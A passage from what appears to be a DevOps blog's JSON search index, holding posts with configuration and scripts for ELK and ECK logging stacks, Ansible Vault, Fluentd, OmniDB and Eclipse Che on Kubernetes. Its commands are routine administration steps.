/data/var/log/apps/**/logs/*.log 8# - /data/var/log/apps/**/*.log 9 10 fields: 11 log_format: ues_mgr 12 13 multiline.pattern: \u0026#39;^{|^\\[|^\\d+-\\d+-\\d+\u0026#39; 14 multiline.negate: true 15 multiline.match: after 16 17 18filebeat.config.modules: 19 20 path: ${path.config}/modules.d/*.yml 21 reload.enabled: false 22 23 24output.logstash: 25 26 hosts: [\u0026#34;localhost:5044\u0026#34;] Don\u0026rsquo;t forget enable the port provider the services 1firewall-cmd --zone=public --add-port=5044/tcp --permanent 2firewall-cmd --zone=public --add-port=9200/tcp --permanent 3firewall-cmd --reload ","link":"https://blog.wisekee.com/post/docker-compose-elk/","section":"post","tags":["elk","docker","docker-compose"],"title":"Launch and setup the ELK stack use docker compose service"},{"body":"","link":"https://blog.wisekee.com/tags/aes-encrypt/","section":"tags","tags":null,"title":"Aes encrypt"},{"body":"Wrap the ansible vault scripts 1#!/usr/bin/env bash 2 3[ \u0026#34;$#\u0026#34; -gt 2 ] || { 4 echo \u0026#34;Usage $0 encrypt|decrypt option...\u0026#34; 5 echo \u0026#34;Must be least three argumeents required\u0026#34; 6 exit 1 7} 8 9#the decrypt key file path, also can put the aws ssm 10vault_id=\u0026#39;/opt/ansible_pass\u0026#39; 11 12 13function encrypt() { 14 ansible-vault encrypt_string --vault-password-file $1 $2 --name $3 15} 16 17function decrypt() { 18 ansible -i $1 $2 -m ansible.builtin.debug -a var=\u0026#34;${3}\u0026#34; -e $4 --vault-id $5 19} 20 21case \u0026#34;$1\u0026#34; in 22 encrypt) 23 shift 1 24 [ \u0026#34;$#\u0026#34; -eq 2 ] || { 25 echo \u0026#34;Usage $0 encrypt \u0026#39;plain string\u0026#39; \u0026#39;field name\u0026#39;\u0026#34; 26 exit 1 27 } 28 encrypt $vault_id $1 $2 29\t;; 30 decrypt) 31 shift 1 32 [ \u0026#34;$#\u0026#34; -eq 4 ] || { 33 echo \u0026#34;Usage $0 decrypt \u0026#39;inventory\u0026#39; \u0026#39;host\u0026#39; \u0026#39;field name\u0026#39; \u0026#39;var file name\u0026#39; to decrypt content\u0026#34; 34 exit 1 35 } 36 inventory_path=$1 37 host=$2 38 field_name=$3 39 var_file=$4 40 decrypt $inventory_path $host $field_name var_file $vault_id 41\t;; 42 *) 43 echo \u0026#34;Arguments is error...\u0026#34; 44 exit 1 45\t;; 46esac Usage steps and instructions 1# put the encrypt keys to secure path in current machine, don\u0026#39;t commit to git or remote repos 2echo \u0026#34;xxxxx\u0026#34; \u0026gt; /opt/ansible_pass 3 4# encrypt the field password 5# usage ./exec.sh encrypt plain_pass field_name 6./exec.sh encrypt xxxx ansible_ssh_password 7 8# view the plain value for encrypt items 9#./exec.sh decrypt inventories/path host_var encrypt_field the_file_name_host_vars_file 10./exec.sh decrypt inventories/newyork nexus ansible_ssh_password nexus 11 12# play arguments for vault-id to AES key path 13 ansible-playbook -i inventories/pairs site.yml --extra-vars \u0026#34;target_server=bastion\u0026#34; --vault-id /opt/ansible_pass ","link":"https://blog.wisekee.com/post/ansible-encrypt-secure/","section":"post","tags":["Ansible","Aes encrypt","vault"],"title":"Ansible encrypt and decrypt the secure fields"},{"body":"","link":"https://blog.wisekee.com/tags/eck/","section":"tags","tags":null,"title":"ECK"},{"body":"The syntax ingest pipeline template convenient for search\n1[ 2 { 3 \u0026#34;grok\u0026#34;: { 4 \u0026#34;field\u0026#34;: \u0026#34;message\u0026#34;, 5 \u0026#34;patterns\u0026#34;: [ 6 \u0026#34;%{IPORHOST:remote_addr} - %{USERNAME:remote_user} \\\\[%{HTTPDATE:time_local}\\\\] \\\\\\\u0026#34;%{DATA:request}\\\\\\\u0026#34; %{INT:status} %{NUMBER:bytes_sent} \\\\\\\u0026#34;%{DATA:http_referer}\\\\\\\u0026#34; \\\\\\\u0026#34;%{DATA:http_user_agent}\\\\\\\u0026#34; \\\\\\\u0026#34;%{DATA:http_x_forwarded_for}\\\\\\\u0026#34; rt=\\\\\\\u0026#34;(?:%{NUMBER:request_time}|-)\\\\\\\u0026#34; uct=\\\\\\\u0026#34;(?:%{NUMBER:upstream_connect_time}|-)\\\\\\\u0026#34; uht=\\\\\\\u0026#34;(?:%{NUMBER:upstream_header_time}|-)\\\\\\\u0026#34; urt=\\\\\\\u0026#34;(?:%{NUMBER:upstream_response_time}|-)\\\\\\\u0026#34;\u0026#34; 7 ], 8 \u0026#34;ignore_missing\u0026#34;: true, 9 \u0026#34;if\u0026#34;: \u0026#34;ctx.source.toLowerCase().contains(\u0026#39;nginx\u0026#39;)\u0026#34;, 10 \u0026#34;ignore_failure\u0026#34;: true, 11 \u0026#34;description\u0026#34;: \u0026#34;nginx\u0026#34; 12 } 13 }, 14 { 15 \u0026#34;grok\u0026#34;: { 16 \u0026#34;field\u0026#34;: \u0026#34;source\u0026#34;, 17 \u0026#34;patterns\u0026#34;: [ 18 \u0026#34;^/var/www/webapp/logs/(?\u0026lt;app_id\u0026gt;[^/]+)\u0026#34; 19 ], 20 \u0026#34;ignore_missing\u0026#34;: true, 21 \u0026#34;if\u0026#34;: \u0026#34;ctx.source =~ /^\\\\/var\\\\/www\\\\/webapp\\\\//\u0026#34;, 22 \u0026#34;ignore_failure\u0026#34;: true, 23 \u0026#34;description\u0026#34;: \u0026#34;java app_id\u0026#34; 24 } 25 }, 26 { 27 \u0026#34;grok\u0026#34;: { 28 \u0026#34;field\u0026#34;: \u0026#34;source\u0026#34;, 29 \u0026#34;patterns\u0026#34;: [ 30 \u0026#34;^/var/applog/(?\u0026lt;app_id\u0026gt;[^/]+)\u0026#34; 31 ], 32 \u0026#34;ignore_missing\u0026#34;: true, 33 \u0026#34;if\u0026#34;: \u0026#34;ctx.source =~ /^\\\\/var\\\\/applog\\\\//\u0026#34;, 34 \u0026#34;ignore_failure\u0026#34;: true, 35 \u0026#34;description\u0026#34;: \u0026#34;php app_id\u0026#34; 36 } 37 }, 38 { 39 \u0026#34;grok\u0026#34;: { 40 \u0026#34;field\u0026#34;: \u0026#34;message\u0026#34;, 41 \u0026#34;patterns\u0026#34;: [ 42 \u0026#34;^%{TIMESTAMP_ISO8601:Timestamp} (\\\\[)(?\u0026lt;IP\u0026gt;(?:[0-9\\\\.\\\\-]+))(\\\\])(\\\\[)(?\u0026lt;UserID\u0026gt;(?:[0-9\\\\-]+))(\\\\])(\\\\[)(?\u0026lt;SessionID\u0026gt;(?:[0-9a-zA-Z\\\\-]+))(\\\\])(\\\\[)(?\u0026lt;RequestID\u0026gt;(?:[0-9a-zA-Z\\\\-]+))(\\\\])(\\\\[)(?\u0026lt;SeverityLevel\u0026gt;(?:[a-zA-Z\\\\s]+))(\\\\])(\\\\[)(?\u0026lt;Category\u0026gt;(?:[0-9a-zA-Z\\\\\\\\_:]+))(\\\\])\\\\s+(?\u0026lt;Message\u0026gt;(?m:.*))$\u0026#34; 43 ], 44 \u0026#34;ignore_missing\u0026#34;: true, 45 \u0026#34;if\u0026#34;: \u0026#34;ctx.source =~ /^\\\\/var\\\\/applog\\\\//\u0026#34;, 46 \u0026#34;ignore_failure\u0026#34;: true, 47 \u0026#34;description\u0026#34;: \u0026#34;php message\u0026#34; 48 } 49 }, 50 { 51 \u0026#34;grok\u0026#34;: { 52 \u0026#34;field\u0026#34;: \u0026#34;message\u0026#34;, 53 \u0026#34;patterns\u0026#34;: [ 54 \u0026#34;%{TIMESTAMP_ISO8601:log_time} (?\u0026lt;log_level\u0026gt;[^\\\\s]+)\\\\s+\\\\[(?\u0026lt;ecs_cluster\u0026gt;[^\\\\s]+)\\\\](.*)?\u0026#34; 55 ], 56 \u0026#34;ignore_missing\u0026#34;: true, 57 \u0026#34;if\u0026#34;: \u0026#34;ctx.source =~ /^\\\\/var\\\\/www\\\\/webapp\\\\//\u0026#34;, 58 \u0026#34;ignore_failure\u0026#34;: true, 59 \u0026#34;description\u0026#34;: \u0026#34;java message body extract\u0026#34; 60 } 61 }, 62 { 63 \u0026#34;date\u0026#34;: { 64 \u0026#34;field\u0026#34;: \u0026#34;log_time\u0026#34;, 65 \u0026#34;formats\u0026#34;: [ 66 \u0026#34;ISO8601\u0026#34; 67 ], 68 \u0026#34;target_field\u0026#34;: \u0026#34;log_timestamp\u0026#34;, 69 \u0026#34;timezone\u0026#34;: \u0026#34;Atlantic/Stanley\u0026#34;, 70 \u0026#34;locale\u0026#34;: \u0026#34;en\u0026#34;, 71 \u0026#34;if\u0026#34;: \u0026#34;ctx.source =~ /^\\\\/var\\\\/www\\\\/webapp\\\\// \u0026#34;, 72 \u0026#34;ignore_failure\u0026#34;: true, 73 \u0026#34;description\u0026#34;: \u0026#34;java log_time\u0026#34; 74 } 75 }, 76 { 77 \u0026#34;lowercase\u0026#34;: { 78 \u0026#34;field\u0026#34;: \u0026#34;app_id\u0026#34;, 79 \u0026#34;ignore_missing\u0026#34;: true 80 } 81 }, 82 { 83 \u0026#34;lowercase\u0026#34;: { 84 \u0026#34;field\u0026#34;: \u0026#34;type\u0026#34;, 85 \u0026#34;ignore_missing\u0026#34;: true, 86 \u0026#34;ignore_failure\u0026#34;: true 87 } 88 }, 89 { 90 \u0026#34;convert\u0026#34;: { 91 \u0026#34;field\u0026#34;: \u0026#34;request_time\u0026#34;, 92 \u0026#34;type\u0026#34;: \u0026#34;float\u0026#34;, 93 \u0026#34;ignore_missing\u0026#34;: true, 94 \u0026#34;ignore_failure\u0026#34;: true 95 } 96 }, 97 { 98 \u0026#34;convert\u0026#34;: { 99 \u0026#34;field\u0026#34;: \u0026#34;upstream_connect_time\u0026#34;, 100 \u0026#34;type\u0026#34;: \u0026#34;float\u0026#34;, 101 \u0026#34;ignore_missing\u0026#34;: true, 102 \u0026#34;ignore_failure\u0026#34;: true 103 } 104 }, 105 { 106 \u0026#34;convert\u0026#34;: { 107 \u0026#34;field\u0026#34;: \u0026#34;upstream_response_time\u0026#34;, 108 \u0026#34;type\u0026#34;: \u0026#34;float\u0026#34;, 109 \u0026#34;ignore_missing\u0026#34;: true, 110 \u0026#34;ignore_failure\u0026#34;: true 111 } 112 }, 113 { 114 \u0026#34;convert\u0026#34;: { 115 \u0026#34;field\u0026#34;: \u0026#34;upstream_header_time\u0026#34;, 116 \u0026#34;type\u0026#34;: \u0026#34;float\u0026#34;, 117 \u0026#34;ignore_missing\u0026#34;: true, 118 \u0026#34;ignore_failure\u0026#34;: true 119 } 120 }, 121 { 122 \u0026#34;remove\u0026#34;: { 123 \u0026#34;field\u0026#34;: \u0026#34;host\u0026#34;, 124 \u0026#34;ignore_missing\u0026#34;: true, 125 \u0026#34;ignore_failure\u0026#34;: true, 126 \u0026#34;description\u0026#34;: \u0026#34;remove old host field\u0026#34; 127 } 128 }, 129 { 130 \u0026#34;set\u0026#34;: { 131 \u0026#34;field\u0026#34;: \u0026#34;host\u0026#34;, 132 \u0026#34;value\u0026#34;: \u0026#34;{{beat.hostname}}\u0026#34;, 133 \u0026#34;ignore_empty_value\u0026#34;: true, 134 \u0026#34;description\u0026#34;: \u0026#34;set new host field\u0026#34; 135 } 136 }, 137 { 138 \u0026#34;set\u0026#34;: { 139 \u0026#34;field\u0026#34;: \u0026#34;env\u0026#34;, 140 \u0026#34;value\u0026#34;: \u0026#34;dev\u0026#34;, 141 \u0026#34;override\u0026#34;: false, 142 \u0026#34;ignore_empty_value\u0026#34;: true, 143 \u0026#34;if\u0026#34;: \u0026#34;ctx.beat.hostname.toLowerCase().contains(\u0026#39;1-1\u0026#39;)\u0026#34;, 144 \u0026#34;description\u0026#34;: \u0026#34;add dev env tag\u0026#34; 145 } 146 }, 147 { 148 \u0026#34;set\u0026#34;: { 149 \u0026#34;field\u0026#34;: \u0026#34;env\u0026#34;, 150 \u0026#34;value\u0026#34;: \u0026#34;qa\u0026#34;, 151 \u0026#34;ignore_empty_value\u0026#34;: true, 152 \u0026#34;if\u0026#34;: \u0026#34;ctx.beat.hostname.toLowerCase().contains(\u0026#39;1-2\u0026#39;)\u0026#34;, 153 \u0026#34;description\u0026#34;: \u0026#34;add qa env tag\u0026#34; 154 } 155 }, 156 { 157 \u0026#34;set\u0026#34;: { 158 \u0026#34;field\u0026#34;: \u0026#34;env\u0026#34;, 159 \u0026#34;value\u0026#34;: \u0026#34;uat\u0026#34;, 160 \u0026#34;ignore_empty_value\u0026#34;: true, 161 \u0026#34;if\u0026#34;: \u0026#34;ctx.beat.hostname.toLowerCase().contains(\u0026#39;1-3\u0026#39;)\u0026#34;, 162 \u0026#34;description\u0026#34;: \u0026#34;add uat env tag\u0026#34; 163 } 164 }, 165 { 166 \u0026#34;set\u0026#34;: { 167 \u0026#34;field\u0026#34;: \u0026#34;env\u0026#34;, 168 \u0026#34;value\u0026#34;: \u0026#34;prod\u0026#34;, 169 \u0026#34;ignore_empty_value\u0026#34;: true, 170 \u0026#34;if\u0026#34;: \u0026#34;ctx.beat.hostname.toLowerCase().contains(\u0026#39;1-4\u0026#39;)\u0026#34;, 171 \u0026#34;description\u0026#34;: \u0026#34;add prod env tag\u0026#34; 172 } 173 }, 174 { 175 \u0026#34;date_index_name\u0026#34;: { 176 \u0026#34;field\u0026#34;: \u0026#34;@timestamp\u0026#34;, 177 \u0026#34;date_rounding\u0026#34;: \u0026#34;M\u0026#34;, 178 \u0026#34;index_name_prefix\u0026#34;: \u0026#34;{{env}}-{{app_id}}-\u0026#34;, 179 \u0026#34;index_name_format\u0026#34;: \u0026#34;yyyy-MM\u0026#34;, 180 \u0026#34;date_formats\u0026#34;: [ 181 \u0026#34;ISO8601\u0026#34; 182 ] 183 } 184 } 185] ","link":"https://blog.wisekee.com/post/elastic-cloud-ingest-pipeline/","section":"post","tags":["ECK","ingest","ELK"],"title":"Elastic cloud ingest pipeline template"},{"body":"","link":"https://blog.wisekee.com/tags/ingest/","section":"tags","tags":null,"title":"ingest"},{"body":"Use the Elasticsearch cloud on k8s component as logs and apm platform. the Fluentd collect the kubernetes container logs to Elasticsearch and kibana represent and search\nThe ECK operator configure The ECK operator custom resources use kubectl providers.\n1terraform { 2 required_providers { 3 kubectl = { 4 source = \u0026#34;gavinbunney/kubectl\u0026#34; 5 version = \u0026#34;1.11.1\u0026#34; 6 } 7 } 8} 9 10resource \u0026#34;helm_release\u0026#34; \u0026#34;eck-operator\u0026#34; { 11 chart = \u0026#34;${path.module}/../../../../../charts/eck-operator\u0026#34; 12 name = \u0026#34;eck-operator\u0026#34; 13 namespace = \u0026#34;kube-monitor\u0026#34; 14 15 values = [ 16 \u0026lt;\u0026lt;-EOF 17 image: 18 repository: \u0026#34;${var.repository_prefix}/public/eck-operator\u0026#34; 19 config: 20 containerRegistry: \u0026#34;${var.repository_prefix}/public\u0026#34; 21 internal: 22 kubeVersion: 1.21.1 23 EOF 24 ] 25} 26 27locals { 28 template_vars = { 29 namespace = \u0026#34;kube-monitor\u0026#34; 30 elasticsearch_version = \u0026#34;7.12.1\u0026#34; 31 elasticsearch_image = \u0026#34;${var.repository_prefix}/public/elasticsearch:7.12.1\u0026#34; 32 master_node_count = var.node_count.master 33 storage_size = var.es_storage_size 34 default_storage_class = var.default_storage_class_name 35 data_node_count = var.node_count.data 36 } 37} 38 39resource \u0026#34;kubectl_manifest\u0026#34; \u0026#34;elasticsearch\u0026#34; { 40 yaml_body = templatefile(\u0026#34;${path.module}/elastic_cluster.yaml\u0026#34;, local.template_vars) 41} The elasticsearch custom resource definiations 1apiVersion: elasticsearch.k8s.elastic.co/v1 2kind: Elasticsearch 3metadata: 4 name: elasticsearch-cluster 5 namespace: ${namespace} 6spec: 7 version: ${elasticsearch_version} 8 volumeClaimDeletePolicy: DeleteOnScaledownOnly 9 nodeSets: 10 - name: masters 11 count: ${master_node_count} 12 config: 13 node.roles: [\u0026#34;master\u0026#34;] 14 podTemplate: 15 metadata: 16 labels: 17 name: elasticsearch 18 spec: 19 containers: 20 - name: elasticsearch 21 image: ${elasticsearch_image} 22 resources: 23 requests: 24 memory: 1Gi 25 cpu: 1 26 limits: 27 memory: 4Gi 28 cpu: 2 29 volumeClaimTemplates: 30 - metadata: 31 name: elasticsearch-data 32 spec: 33 accessModes: 34 - ReadWriteMany 35 resources: 36 requests: 37 storage: ${storage_size} 38 storageClassName: ${default_storage_class} 39 - name: data 40 count: ${data_node_count} 41 config: 42 node.roles: [\u0026#34;data\u0026#34;, \u0026#34;ingest\u0026#34;, \u0026#34;ml\u0026#34;, \u0026#34;transform\u0026#34;] 43 podTemplate: 44 metadata: 45 labels: 46 name: elasticsearch 47 spec: 48 containers: 49 - name: elasticsearch 50 image: ${elasticsearch_image} 51 resources: 52 requests: 53 memory: 1Gi 54 cpu: 1 55 limits: 56 memory: 4Gi 57 cpu: 2 58 volumeClaimTemplates: 59 - metadata: 60 name: elasticsearch-data 61 spec: 62 accessModes: 63 - ReadWriteMany 64 resources: 65 requests: 66 storage: ${storage_size} 67 storageClassName: ${default_storage_class} The kibana terraform code 1locals { 2 kibana_template_vars = { 3 namespace = \u0026#34;kube-monitor\u0026#34; 4 version = \u0026#34;7.12.1\u0026#34; 5 image = \u0026#34;${var.repository_prefix}/public/kibana:7.12.1\u0026#34; 6 node_count = var.node_count.kibana 7 } 8} 9 10resource \u0026#34;kubectl_manifest\u0026#34; \u0026#34;kibana\u0026#34; { 11 yaml_body = templatefile(\u0026#34;${path.module}/kibana.yaml\u0026#34;, local.kibana_template_vars) 12} 13 14resource \u0026#34;kubernetes_ingress\u0026#34; \u0026#34;kibana\u0026#34; { 15 metadata { 16 name = \u0026#34;kibana-ingress\u0026#34; 17 namespace = \u0026#34;kube-monitor\u0026#34; 18 labels = { 19 app = \u0026#34;kibana-ingress\u0026#34; 20 } 21 } 22 spec { 23 rule { 24 host = var.kibana_domain 25 http { 26 path { 27 path = \u0026#34;/\u0026#34; 28 backend { 29 service_name = \u0026#34;kibana-kb-http\u0026#34; 30 service_port = 5601 31 } 32 } 33 } 34 } 35 } 36} The kibana custom resource 1apiVersion: kibana.k8s.elastic.co/v1 2kind: Kibana 3metadata: 4 name: kibana 5 namespace: ${namespace} 6spec: 7 version: ${version} 8 count: ${node_count} 9 image: ${image} 10 elasticsearchRef: 11 name: elasticsearch-cluster 12 podTemplate: 13 metadata: 14 labels: 15 name: kibana 16 spec: 17 containers: 18 - name: kibana 19 resources: 20 requests: 21 memory: 1Gi 22 cpu: 0.5 23 limits: 24 memory: 2Gi 25 cpu: 2 26 http: 27 tls: 28 selfSignedCertificate: 29 disabled: true The fluentd terraform configure Use tcp inputs and scrap kuberntes containers log forward to aggregate fluentd and send to elasticsearch\n1resource \u0026#34;helm_release\u0026#34; \u0026#34;fluentd\u0026#34; { 2 chart = \u0026#34;${path.module}/../../../../charts/fluentd\u0026#34; 3 name = \u0026#34;fluentd\u0026#34; 4 namespace = var.namespace 5 6 values = [ 7 \u0026lt;\u0026lt;-EOF 8 image: 9 registry: \u0026#34;${var.repository_prefix}\u0026#34; 10 repository: \u0026#34;public/fluentd\u0026#34; 11 tag: \u0026#34;1.13.1-debian-10-r0\u0026#34; 12 forwarder: 13 persistence: 14 enabled: true 15 extraVolumes: 16 - name: dockerlink 17 hostPath: 18 path: \u0026#34;/data2/docker\u0026#34; 19 type: \u0026#34;Directory\u0026#34; 20 extraVolumeMounts: 21 - name: dockerlink 22 mountPath: \u0026#34;/data2/docker\u0026#34; 23 extraEnv: 24 - name: FLUENTD_UID 25 value: \u0026#34;0\u0026#34; 26 configMapFiles: 27 fluentd-inputs.conf: | 28 \u0026lt;source\u0026gt; 29 @type tcp 30 bind 0.0.0.0 31 port 24224 32 delimiter \u0026#34;\\n\u0026#34; 33 source_address_key client_addr 34 tag ues.services 35 \u0026lt;parse\u0026gt; 36 @type json 37 \u0026lt;/parse\u0026gt; 38 \u0026lt;/source\u0026gt; 39 \u0026lt;source\u0026gt; 40 @type http 41 port 9880 42 \u0026lt;/source\u0026gt; 43 \u0026lt;source\u0026gt; 44 @type tail 45 path /var/log/containers/*.log 46 exclude_path /var/log/containers/*fluentd*.log 47 pos_file /opt/bitnami/fluentd/logs/buffers/fluentd-docker.pos 48 tag kubernetes.* 49 read_from_head true 50 \u0026lt;parse\u0026gt; 51 @type multi_format 52 \u0026lt;pattern\u0026gt; 53 format json 54 time_key time 55 time_format %Y-%m-%dT%H:%M:%S.%NZ 56 \u0026lt;/pattern\u0026gt; 57 \u0026lt;pattern\u0026gt; 58 format /^(?\u0026lt;time\u0026gt;.+) (?\u0026lt;stream\u0026gt;stdout|stderr) [^ ]* (?\u0026lt;log\u0026gt;.*)$/ 59 time_format %Y-%m-%dT%H:%M:%S.%N%:z 60 \u0026lt;/pattern\u0026gt; 61 \u0026lt;/parse\u0026gt; 62 \u0026lt;/source\u0026gt; 63 \u0026lt;filter kubernetes.**\u0026gt; 64 @type kubernetes_metadata 65 \u0026lt;/filter\u0026gt; 66 containerPorts: 67 - name: tcp 68 containerPort: 24224 69 protocol: TCP 70 - name: http 71 containerPort: 9880 72 protocol: TCP 73 service: 74 ports: 75 tcp: 76 port: 24224 77 targetPort: tcp 78 protocol: TCP 79 http: 80 port: 9880 81 targetPort: http 82 protocol: TCP 83 resources: 84 requests: 85 cpu: 100m 86 memory: 500Mi 87 limits: 88 cpu: 1000m 89 memory: 2Gi 90 aggregator: 91 extraEnv: 92 - name: ELASTIC_PASSWORD 93 valueFrom: 94 secretKeyRef: 95 name: \u0026#34;elasticsearch-cluster-es-elastic-user\u0026#34; 96 key: \u0026#34;elastic\u0026#34; 97 configMapFiles: 98 fluentd-output.conf: | 99 \u0026lt;match fluentd.healthcheck\u0026gt; 100 @type stdout 101 \u0026lt;/match\u0026gt; 102 \u0026lt;match kubernetes.**\u0026gt; 103 @type elasticsearch 104 include_tag_key true 105 suppress_type_name true 106 host \u0026#34;elasticsearch-cluster-es-data\u0026#34; 107 port \u0026#34;9200\u0026#34; 108 scheme \u0026#34;https\u0026#34; 109 ssl_verify false 110 user \u0026#34;elastic\u0026#34; 111 password \u0026#34;#{ENV[\u0026#39;ELASTIC_PASSWORD\u0026#39;]}\u0026#34; 112 logstash_format true 113 logstash_prefix kubernetes 114 logstash_dateformat %Y.%m 115 include_timestamp true 116 reconnect_on_error true 117 reload_on_failure true 118 reload_connections false 119 \u0026lt;buffer\u0026gt; 120 @type memory 121 \u0026lt;/buffer\u0026gt; 122 \u0026lt;/match\u0026gt; 123 \u0026lt;match ues.**\u0026gt; 124 @type elasticsearch 125 include_tag_key true 126 suppress_type_name true 127 host \u0026#34;elasticsearch-cluster-es-data\u0026#34; 128 port \u0026#34;9200\u0026#34; 129 scheme \u0026#34;https\u0026#34; 130 ssl_verify false 131 user \u0026#34;elastic\u0026#34; 132 password \u0026#34;#{ENV[\u0026#39;ELASTIC_PASSWORD\u0026#39;]}\u0026#34; 133 logstash_format true 134 logstash_prefix ues 135 logstash_dateformat %Y.%m 136 include_timestamp true 137 reconnect_on_error true 138 reload_on_failure true 139 reload_connections false 140 \u0026lt;buffer\u0026gt; 141 @type memory 142 \u0026lt;/buffer\u0026gt; 143 \u0026lt;/match\u0026gt; 144 resources: 145 requests: 146 cpu: 100m 147 memory: 500Mi 148 limits: 149 cpu: 1000m 150 memory: 2Gi 151 EOF 152 ] 153} ","link":"https://blog.wisekee.com/post/eck-vs-flutd-collect-logs/","section":"post","tags":["Terraform","Elasticsearch","Fluentd"],"title":"ECK stack up and running and collect logs use fluentd in kubernetes"},{"body":"","link":"https://blog.wisekee.com/tags/elasticsearch/","section":"tags","tags":null,"title":"Elasticsearch"},{"body":"","link":"https://blog.wisekee.com/tags/fluentd/","section":"tags","tags":null,"title":"Fluentd"},{"body":"","link":"https://blog.wisekee.com/tags/deployment/","section":"tags","tags":null,"title":"Deployment"},{"body":"OmniDB is tool for unify the multiple type DataBase management,appropriate deploy in enterprise internal proxy access to other environment.\nfetch the Dockerfile in this url: OminDB Dockerfile Build the docker image docker build . -t dev.com/library/omnidb:latest then push the image to registry:docker push dev.com/library/omnidb:latest\ncreate the kubernetes deployment manifest file 1apiVersion: v1 2kind: PersistentVolumeClaim 3metadata: 4 name: omnidb-pvc 5spec: 6 accessModes: 7 - ReadWriteOnce 8 storageClassName: nfs-client 9 resources: 10 requests: 11 storage: 5Gi 12--- 13apiVersion: apps/v1 14kind: Deployment 15metadata: 16 name: omnidb-deployment 17 labels: 18 app: omnidb 19spec: 20 replicas: 1 21 selector: 22 matchLabels: 23 app: omnidb 24 template: 25 metadata: 26 labels: 27 app: omnidb 28 spec: 29 containers: 30 - name: omnidb 31 image: dev.com/library/omnidb:latest 32 ports: 33 - containerPort: 8000 34 volumeMounts: 35 - mountPath: /home/omnidb/.omnidb 36 name: omnidb-data 37 volumes: 38 - name: omnidb-data 39 persistentVolumeClaim: 40 claimName: omnidb-pvc 41--- 42apiVersion: v1 43kind: Service 44metadata: 45 name: omnidb 46spec: 47 ports: 48 - name: server 49 port: 8080 50 targetPort: 8000 51 selector: 52 app: omnidb Add the ingress in order to access to OmniDB 1kind: Ingress 2apiVersion: extensions/v1beta1 3metadata: 4 name: omnidb-ingress 5 namespace: default 6 labels: 7 app: omnidb 8 annotations: 9 ingress.kubernetes.io/proxy-body-size: \u0026#39;0\u0026#39; 10 nginx.ingress.kubernetes.io/proxy-body-size: \u0026#39;0\u0026#39; 11 nginx.ingress.kubernetes.io/ssl-redirect: \u0026#39;true\u0026#39; 12spec: 13 rules: 14 - host: omnidb.dev.com 15 http: 16 paths: 17 - path: / 18 backend: 19 serviceName: omnidb 20 servicePort: 8080 ","link":"https://blog.wisekee.com/post/omnidb-installing/","section":"post","tags":["OmniDB","Deployment"],"title":"Installing OmniDB in kubernetes as deployment resource"},{"body":"","link":"https://blog.wisekee.com/tags/omnidb/","section":"tags","tags":null,"title":"OmniDB"},{"body":"","link":"https://blog.wisekee.com/tags/eclipse-che/","section":"tags","tags":null,"title":"Eclipse-Che"},{"body":"At first installing OLM Requirement: kubectl configred and connect to Kubernetes cluster correct.\n1curl -L https://github.com/operator-framework/operator-lifecycle-manager/releases/download/v0.17.0/install.sh -o install.sh 2chmod +x install.sh 3./install.sh v0.17.0 Installing Eclipse-Che Operator According to: eclipse-che operator\n1kubectl create -f https://operatorhub.io/install/eclipse-che.yaml 2# view the Operator resources 3kubectl get pods --all-namespaces | grep olm 4# and the CluseterServiceVersion 5kubectl get csv -n my-eclipse-che Install Eclipse-che instance use CheCluster resource 1#The partial configure need to change 2 k8s: 3 ingressClass: \u0026#39;nginx\u0026#39; 4 ingressDomain: \u0026#39;che.dev.com\u0026#39; 5 ingressStrategy: \u0026#39;single-host\u0026#39; 6 securityContextFsGroup: \u0026#39;\u0026#39; 7 securityContextRunAsUser: \u0026#39;\u0026#39; 8 singleHostExposureType: \u0026#39;\u0026#39; 9 tlsSecretName: \u0026#39;self-domain-cert\u0026#39; 10 server: 11 cheHost: \u0026#39;che.dev.com\u0026#39; 12 cheHostTLSSecret: \u0026#39;self-domain-cert\u0026#39; 13 #You can add more custom properties refer to this url: https://www.eclipse.org/che/docs/che-7/installation-guide/advanced-configuration-options-for-the-che-server-component/ 14 customCheProperties: 15 CHE_LIMITS_USER_WORKSPACES_RUN_COUNT: \u0026#34;10\u0026#34; 16 tlsSupport: true 17\tstorage: 18 postgresPVCStorageClassName: \u0026#39;nfs-client\u0026#39; 19 workspacePVCStorageClassName: \u0026#39;nfs-client\u0026#39; Execute the following command 1kubectl create -f ./CheCluster.yml -n my-eclipse-che # or apply the resources update use `kubectl apply` View the KeyCloak credentials information 1k get secrets/che-identity-secret -n my-eclipse-che -o jsonpath=\u0026#39;{.data}\u0026#39; ","link":"https://blog.wisekee.com/post/installing-eclipse-che-in-kubernetes/","section":"post","tags":["Kubernetes","Eclipse-Che","Operator"],"title":"Installing eclipse-che in native kubernetes platform"},{"body":"","link":"https://blog.wisekee.com/tags/operator/","section":"tags","tags":null,"title":"Operator"},{"body":"We what collect and storage kubernetes events to elasticsearch, easy to query and analyze alerts. we use this github repo componentkubernetes-event-exporter\nThe main.tf include kubernetes \u0026lsquo;deployment\u0026rsquo; object 1resource \u0026#34;kubernetes_deployment\u0026#34; \u0026#34;event_export\u0026#34; { 2 metadata { 3 name = \u0026#34;event-export\u0026#34; 4 namespace = \u0026#34;kube-system\u0026#34; 5 labels = { 6 app = \u0026#34;event-export\u0026#34; 7 } 8 } 9 10 spec { 11 replicas = 1 12 13 selector { 14 match_labels = { 15 app = \u0026#34;event-export\u0026#34; 16 } 17 } 18 19 template { 20 metadata { 21 labels = { 22 app = \u0026#34;event-export\u0026#34; 23 version = \u0026#34;v1\u0026#34; 24 } 25 } 26 27 spec { 28 service_account_name = kubernetes_service_account.event_export.metadata[0].name 29 automount_service_account_token = true 30 container { 31 image = \u0026#34;opsgenie/kubernetes-event-exporter:0.9\u0026#34; 32 args = [ 33 \u0026#34;-conf=/data/config.yaml\u0026#34;, 34 ] 35 name = \u0026#34;event-export\u0026#34; 36 resources { 37 requests { 38 memory = \u0026#34;50Mi\u0026#34; 39 } 40 limits { 41 memory = \u0026#34;100Mi\u0026#34; 42 } 43 } 44 volume_mount { 45 name = \u0026#34;cfg\u0026#34; 46 mount_path = \u0026#34;/data\u0026#34; 47 } 48 image_pull_policy = \u0026#34;IfNotPresent\u0026#34; 49 } 50 volume { 51 name = \u0026#34;cfg\u0026#34; 52 config_map { 53 name = kubernetes_config_map.event_export_config.metadata[0].name 54 } 55 } 56 } 57 } 58 } 59 60 depends_on = [ 61 kubernetes_service_account.event_export 62 ] 63 64} The configmap.tf indlude the kubernetes configMap object storage event-exporter\u0026rsquo;s config as volume mount to previous deployment\u0026rsquo;s pod container 1resource \u0026#34;kubernetes_config_map\u0026#34; \u0026#34;event_export_config\u0026#34; { 2 metadata { 3 name = \u0026#34;event-export-config\u0026#34; 4 